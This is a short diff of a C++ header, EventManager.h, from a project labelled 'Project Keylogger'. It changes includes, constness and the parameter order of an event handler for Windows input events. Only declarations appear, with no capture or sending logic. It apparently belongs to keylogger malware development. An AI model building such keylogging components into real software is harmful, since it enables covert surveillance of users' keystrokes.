@@ -2,21 +2,26 @@
  *					Project Keylogger
  */
 
-
 #ifndef				_EVENTMANAGER_H
 #define				_EVENTMANAGER_H
 
-#include			<Windows.h>
+#include					<Windows.h>
+#include					<iostream>
 
-class Keylogger;
+#include					"EventFactory.h"
+#include					"Context.h"
 
-class 			EventManager {
+class						Keylogger;
+
+
+class 						EventManager {
 public: 
-    EventManager(const Keylogger&);
+    EventManager(Keylogger&);
 	~EventManager();
-    void handleEvent(const LPARAM, const WPARAM);
+    void					handleEvent(const WPARAM, const LPARAM) const;
 private: 
-    const Keylogger& _keylogger;
+    Keylogger&				_keylogger;
+	struct s_Context*		_context;
 };
 
 #endif //_EVENTMANAGER_H
